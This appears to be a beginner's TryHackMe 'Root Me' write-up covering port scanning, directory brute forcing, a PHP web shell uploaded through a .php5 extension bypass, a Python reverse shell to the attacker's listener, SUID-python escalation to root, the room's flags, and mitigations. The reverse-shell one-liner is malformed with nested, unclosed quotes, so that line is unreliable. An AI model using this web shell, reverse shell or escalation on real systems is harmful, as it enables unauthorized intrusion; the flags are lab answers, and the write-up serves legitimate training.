# Root Me — TryHackMe Write-up

## Overview

* **From**: TryHackMe
* **Room**: Root Me
* **Difficulty**: Easy
* **Category**: Web Exploitation, Privilege Escalation

## Objective

* Gain initial access via web exploitation
* Escalate privileges to root
* Capture both user and root flags

---

## Reconnaissance

### Nmap Scan

```zsh
sudo nmap $target
```

### Output

| Port | Service | Version |
| ---- | ------- | ------- |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache  |


```zsh
sudo nmap -sC -sV -p 80 $target
```

## Output

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
---

## Enumeration

### Directory Brute Force

```zsh
gobuster dir -u http://10.129.158.163> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Discovered Endpoints

* `/panel`
* `/uploads`

---

## Initial Access — File Upload Exploit

### Upload Functionality

The `/panel` endpoint allows file uploads, but seems like doesn't accept accept php extensions. Let's try bypassing it.

### Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### Extension Bypass

Blocked: `.php`
Working bypass:

* `.php5` 

---

## Remote Code Execution

### Accessing Shell

```
http://10.129.158.163/uploads/shell.php5?cmd=id
```

### Reverse Shell

Listener:

```zsh
nc -lvnp 4444
```

Execution:

```python
python3 -c 'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.132.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

---

## 🔧 Shell Stabilization

```zsh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔍 Privilege Escalation

### SUID Enumeration

```bash
find / -user root -perm /4000
```

### Interesting Binary

```
/usr/bin/python
```

---

##Exploitation

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell obtained

---

## Flags

### User Flag

```bash
$ cat user.txt

THM{y0u_g0t_a_sh3ll}
```

### Root Flag

```bash
$ find / -name root.txt
$ cat /root/root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```

---

## ⚡ Key Takeaways

* File upload vulnerabilities can lead to RCE
* Extension filtering is often insufficient
* SUID binaries are critical for privilege escalation
* Python SUID = trivial root compromise

---

## Skills Practiced

* Web enumeration
* Exploitation (file upload)
* Reverse shell handling
* Linux privilege escalation

---

##  Mitigations

- Validate file uploads using MIME type and content inspection
- Disable execution in upload directories
- Remove unnecessary SUID binaries

---
##  Notes

This room is ideal for beginners approaching:

* CTF methodology
* Basic offensive security workflows
